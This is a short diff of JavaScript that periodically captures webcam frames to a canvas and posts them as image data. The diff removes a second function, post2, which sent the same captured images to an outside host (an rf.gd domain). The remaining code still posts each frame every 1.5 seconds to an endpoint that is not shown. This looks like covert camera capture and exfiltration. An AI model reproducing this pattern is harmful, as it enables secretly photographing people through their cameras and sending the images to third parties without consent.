@@ -29,20 +29,6 @@ $.ajax({
   });
 };
 
-function post2(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'http://abolfazl123.rf.gd/test/get.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
 
 'use strict';
 
@@ -79,8 +65,6 @@ var context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
-       post2(canvasData); }, 1500);  
-
 }
 
 // Load init
